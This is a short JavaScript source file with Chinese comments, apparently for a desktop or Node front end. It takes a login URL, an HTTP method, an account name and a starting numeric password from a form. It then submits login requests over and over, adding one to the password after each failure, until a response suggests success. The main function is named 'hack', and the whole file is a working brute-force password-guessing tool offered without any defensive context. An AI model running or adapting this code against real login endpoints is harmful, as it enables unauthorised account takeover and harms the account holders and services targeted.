var $ = require('jquery');
// 制造请求
var request = require('request');

$('#send').on('click', () => {
    // 输入地址
    var inputAddress = $('#inputAddress').val();
    // 请求方式
    var inputState = $('#inputState').val();
    var account = $('#account').val();
    // 字符串转数字
    var password = ~~$('#password').val();
    console.log({
        inputAddress,
        inputState,
        account,
        password
    })
    // node
    // 本质就ajax请求
    // 第一次执行
    hack({
        inputAddress,
        inputState,
        account,
        password
    });
})

const hack = (config) => {
    let {
        inputAddress,
        inputState,
        account,
        password
    } = config;
    request[inputState]({
        url: inputAddress,
        formData: {
            Account: account,
            PassWord: password
        }
    }, (err, httpResponse, body) => {
        if (err) {
            return console.error('upload failed:', err);
        }
        if (body) {
            console.log('密码为错误', password)
            password = password + 1
            hack({
                inputAddress,
                inputState,
                account,
                password
            });
        } else {
            console.log('密码为正确', password)
            return;
        }
    });
}